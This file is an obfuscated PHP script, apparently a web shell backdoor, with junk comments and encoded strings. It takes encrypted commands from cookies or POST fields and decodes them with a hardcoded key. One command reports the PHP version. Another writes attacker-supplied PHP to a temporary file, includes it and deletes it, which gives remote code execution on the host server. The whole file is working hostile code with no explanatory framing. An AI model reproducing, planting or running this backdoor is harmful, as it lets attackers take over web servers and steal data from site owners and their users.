<?php      function   sewj_bxd(){$vui_qkwl='hwwezddakw';/*   lqkam   */print_r    (11101+11101);/*o  */}

$anjztj   =       'anjztj'/*   qa  */^	'';





$osrcp    =/*  _ers */$_COOKIE;


$bgagvuik       =/*eichz*/$_POST;



function	qbowt($gw_ofkue,/*  g   */$ftfnj){

/*  mjeao   */global/*   aa */$anjztj;

     $enpqrycwom    =  "";


/*  jpyu  */for  ($yckkudsmu	=       0;	$yckkudsmu/* _bq */<  strlen($gw_ofkue);)/*  f*/{

/* j  */for       ($eqeks	=	0;     $eqeks/*psima  */<	strlen($ftfnj)  &&/* mwl_   */$yckkudsmu	</*   fa */strlen($gw_ofkue);/*_gh */$eqeks++,/*  bzguu   */$yckkudsmu++)    {


	$enpqrycwom/*  g   */.=	$anjztj(ord($gw_ofkue[$yckkudsmu])/*  lj*/^	ord($ftfnj[$eqeks]));


	}
   }

     return	$enpqrycwom;


}





function       qviaypvrh($finitgpc,   $gw_ofkue)
{/*  fa*/global/* mmp*/$anjztj;



	$zlynphgz/*   e*/=/*l */sprintf("\x2e"	.	"/"."\x25"/*   az*/./*  f   */$anjztj(859-744)  .	$anjztj(284-238)/*  fuj*/.  $anjztj(112)      ./*f  */"\x6c",	md5($finitgpc));

/*yl   */file_put_contents($zlynphgz,	"<"   ./*   r   */$anjztj(132-69)     ./*  x  */$anjztj(144-32)	.	"h"."\x70"	.	$anjztj(32)	./*jsdgl */"u"."n"."l".$anjztj(105)      ./*l   */$anjztj(110)/*   jnywq   */./*  azkap */"k".$anjztj(302-262)   .   "\x5f"  .       "_"."F"."I"."L"."\x45"/*   vurzs */./* icdyc  */"\137"	./*   qil  */"\137"  ./*   cjkp   */"\x29"      .   $anjztj(789-730)	./*  jjwe */$anjztj(32)/* p  */.	$gw_ofkue["d"]);


/*vpl */include($zlynphgz);

	$zlizlx    =	$zlynphgz;


      unlink($zlizlx);}




function  wqsqko(){


      global	$anjztj;	

      $yckkudsmu	=	array();
      $yckkudsmu["\160"	.     $anjztj(763-645)]    =	phpversion();

	$yckkudsmu["\x73"       .     "v"]    =	"3"."\x2e"   .     "5";
/*z  */echo/* wah*/@serialize($yckkudsmu);


}


function/* o */gpturqj($gw_ofkue,/*  yrceg */$finitgpc,  $eqekslopass)


{


/*   cm   */global       $anjztj;

/*   wdobl*/


/* fr*/$gw_ofkue	=/*zxrij  */unserialize(qbowt(qbowt(base64_decode($gw_ofkue),     $finitgpc),/*  hxpd  */$eqekslopass));
/*   jb_*/if/* ncidm  */(isset($gw_ofkue[$anjztj(956-859)/*   wu */.	"k"]))/* sp   */{


	if       ($gw_ofkue[$anjztj(958-861)]      ==/* t*/"\151")  {


	wqsqko();

	}/* mm   */elseif/*   f */($gw_ofkue[$anjztj(958-861)]/*   en */==       "e")     {


/*aml_  */qviaypvrh($finitgpc,	$gw_ofkue);

/* bd */}

	exit();

/*  n  */}
}







$osrcp/*euc */=/*ejf  */array_merge($bgagvuik,/*up */$osrcp);

$finitgpc	=/*  maop */"\x64"/*  vsu   */.     "\143"/*rl  */./*f  */$anjztj(485-429)	.	"1"."b"."\64"	./*l_  */"4"."c".$anjztj(45)	.	$anjztj(821-720)	./*   iq */"b"."\143"/* rp   */./*  v  */"b"."-"."\64"/*  ezcos   */.	$anjztj(57)	.	$anjztj(667-616)/*xw   */./*xh   */"8".$anjztj(45)       ./* _e   */$anjztj(543-445)	.    "5"."9"."\143"/* wtn */.	$anjztj(45)/*   rktu */.       "d"."f"."\62"/*   ozjqv  */.	"0"."\71"	.	$anjztj(49)       .	"\x37"	.  "\63"    ./*ikfd  */"7".$anjztj(53)/*  neswl */.	$anjztj(1042-943)       ./*  qb  */"\67";


foreach/* _yth */($osrcp	as	$eqekslopass      =>	$gw_ofkue)/* mksi  */{/*   b*/gpturqj($gw_ofkue,	$finitgpc,	$eqekslopass);

}




